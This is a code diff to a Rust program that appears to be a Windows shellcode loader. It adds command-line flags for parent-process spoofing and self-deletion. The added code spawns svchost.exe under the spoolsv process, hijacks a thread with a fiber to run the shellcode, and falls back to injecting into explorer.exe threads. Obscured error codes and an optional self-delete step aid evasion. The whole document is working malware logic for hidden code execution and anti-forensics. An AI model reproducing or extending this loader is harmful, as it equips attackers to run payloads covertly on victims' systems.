@@ -3,6 +3,7 @@
 **********************************************************************************/
 
 mod suicide;
+mod spoof_proc;
 mod find_remote;
 mod remote_fiber;
 mod get_privs;
@@ -47,6 +48,11 @@ fn main() -> Result<()> {
         } else {
             "/l" // default to local fiber
         };
+
+        // check if spoofing flag
+        let use_spoofing = args.iter().any(|arg| arg == "/s");
+        // check if delete flag
+        let use_delete = args.iter().any(|arg| arg == "/d");
 
         // enable SeDebugPrivilege if admin
         let _is_admin = is_admin::is_admin();
@@ -262,60 +268,92 @@ fn main() -> Result<()> {
                 // transfer execution to shellcode
                 SwitchToFiber(shellcode_fiber);
                 // may not reach
-                let _ = suicide::delete_self();
+                if use_delete {
+                    let _ = suicide::delete_self();
+                }
             }
 
             "/r" => {
                 // REMOTE FIBER
-                if _is_admin {
-                    println!("[+] Initialized!");
+                
+                // if admin, spoof PPID
+                let mut spoofing_successful = false;
+
+                if _is_admin && use_spoofing {
+                    // find spoof parent
+                    if let Some(parent_pid) = find_remote::find_target_pid("spoolsv") {
+                        // spawn child with parent
+                         match spoof_proc::spawn_spoofed_process(parent_pid, "C:\\Windows\\System32\\svchost.exe") {
+                            Ok(pi) => {
+                                // use new for injection
+                                let h_process = pi.hProcess;
+                                let h_thread = pi.hThread;
+
+                                match remote_fiber::hijack_thread_with_fiber(h_process, h_thread, &shellcode) {
+                                     Ok(_) => {
+                                         println!("[+] Success!");
+                                         let _ = windows::Win32::Foundation::CloseHandle(h_thread);
+                                         let _ = windows::Win32::Foundation::CloseHandle(h_process);
+                                         spoofing_successful = true;
+                                     },
+                                     Err(_e) => {
+                                         println!("Failed: 1001");
+                                         let _ = windows::Win32::System::Threading::TerminateProcess(h_process, 0);
+                                     }
+                                }
+                            },
+                            Err(_e) => {
+                                println!("Failed: 1002");
+                            }
+                        }
+                    } else {
+                        println!("[-] Spoolsv not found!");
+                    }
+                }
+                
+                // if spoof worked, suicide and exit
+                if spoofing_successful {
+                    if use_delete {
+                        let _ = suicide::delete_self();
+                    }
+                    return Ok(());
                 }
 
-                // find target process (user-mode, non-PPL)
+                // if spoof did not work, fallback
+                if _is_admin {
+                     println!("[+] Initialized!");
+                }
+
+                // find target process (explorer)
                 let target_pid = match find_remote::find_target_pid("explorer") {
-                    Some(pid) => {
-                        // println!("[+] Found target PID: {}", pid);
-                        pid
-                    }
-                    None => {
-                        panic!("Failed: 901");
-                    }
+                    Some(pid) => pid,
+                    None => panic!("Failed: 901"),
                 };
 
                 // enum all threads in target process
                 let thread_ids = find_remote::find_all_remote_thread_ids(target_pid);
-
                 if thread_ids.is_empty() {
                     panic!("Failed: 902");
                 }
 
                 // open process handle once
                 let h_process = remote_fiber::open_target_process(target_pid)?;
-
                 let mut injection_success = false;
 
                 // try each thread until one succeeds
-                for (idx, &thread_id) in thread_ids.iter().enumerate() {
-
-                    // open thread handle
+                for (_idx, &thread_id) in thread_ids.iter().enumerate() {
                     let h_thread = match remote_fiber::open_target_thread(thread_id) {
                         Ok(handle) => handle,
-                        Err(_) => {
-                            continue;
-                        }
+                        Err(_) => continue,
                     };
 
-                    // attempt hijack
                     match remote_fiber::hijack_thread_with_fiber(h_process, h_thread, &shellcode) {
                         Ok(_) => {
-                            // println!("[+] Injected via thread ID {}!", thread_id);
                             let _ = remote_fiber::close_thread_handle(h_thread);
                             injection_success = true;
-                            // break after first success to prevent process corruption
                             break;
                         }
-                        Err(e) => {
-                            // println!("[-] Thread {} failed: {:?}", thread_id, e);
+                        Err(_e) => {
                             let _ = remote_fiber::close_thread_handle(h_thread);
                             continue;
                         }
@@ -328,10 +366,10 @@ fn main() -> Result<()> {
                     panic!("Failed: 903");
                 }
 
-                // println!("[+] Completed!");
-
                 // attempt self-delete
-                let _ = suicide::delete_self();
+                if use_delete {
+                    let _ = suicide::delete_self();
+                }
             }
 
             _ => {
